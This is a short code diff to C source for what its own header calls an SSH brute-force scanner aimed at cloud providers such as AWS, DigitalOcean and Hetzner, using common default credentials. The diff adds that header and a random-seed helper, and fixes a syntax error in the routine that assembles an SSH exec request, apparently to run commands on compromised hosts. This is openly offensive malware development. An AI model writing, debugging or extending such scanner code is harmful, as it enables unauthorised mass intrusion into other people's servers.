@@ -2,6 +2,14 @@
 
 #define _GNU_SOURCE
 
+/* ============================================================================
+ * SSH BRUTE-FORCE SCANNER - Cloud Provider Targeting
+ * ============================================================================
+ * Targets cloud providers: AWS, DigitalOcean, Linode, Vultr, OVH, Hetzner
+ * Uses proper SSH protocol handshake with key exchange
+ * Comprehensive credential list with common cloud defaults
+ * ============================================================================ */
+
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -22,6 +30,11 @@
 #include "rand.h"
 #include "util.h"
 #include "checksum.h"
+
+/* Add missing rand() seed initialization */
+static void ssh_rand_seed(void) {
+    srand((unsigned int)time(NULL) ^ (unsigned int)getpid());
+}
 
 /* SSH Scanner settings */
 #define SSH_SCANNER_MAX_CONNS 128
@@ -585,7 +598,7 @@ static void ssh_handle_recv(struct ssh_connection *conn) {
                 /* Channel number */
                 exec_payload[exec_pos++] = 0;
                 exec_payload[exec_pos++] = 0;
-                exec_pos++] = 0;
+                exec_payload[exec_pos++] = 0;
                 exec_payload[exec_pos++] = 1;
                 
                 /* Exec request */
